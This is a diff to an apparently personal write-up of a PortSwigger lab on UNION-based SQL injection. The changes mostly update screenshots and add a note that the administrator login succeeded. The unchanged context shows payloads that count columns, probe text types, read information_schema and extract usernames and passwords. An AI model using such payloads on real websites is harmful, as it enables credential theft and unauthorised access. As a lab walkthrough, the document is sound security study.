@@ -1,4 +1,4 @@
-![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2d6622d8-f4a0-46ac-b83d-d3e221c3dd3a)![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e01a1896-1a40-4ae5-92a3-2e6ea1e984ff)## Lab Description :
+## Lab Description :
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3cf9ef5a-c9ad-4800-949d-dd81ea9b8e22)
 
@@ -28,7 +28,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
 ```
 
-![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e5ef5d6e-34f5-4b4d-9ad3-4db748145142)
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/91fd27bc-97c1-4bbb-a82d-9a9316a61b17)
 
 **2 NULL** returns no error , which means there are 2 columns in the database.
 
@@ -40,7 +40,8 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'Ananthan','r
 ```
 both columns contains text data .
 
-![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/22682f0a-8a1a-473a-94c1-8daf320ece75)
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/812af6a7-26c7-44db-9d2d-95bad1bfe428)
+
 
 ### Database contents-
 
@@ -72,6 +73,11 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username_wknx
 Now we get the username and password of all users.
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/08c71d5f-3634-4436-94f6-4f62aab40afc)
+
+Successfully logged in administrator.
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/49b0ee8c-b50e-49d5-b446-82dc4ffe9689)
+
 
 
 
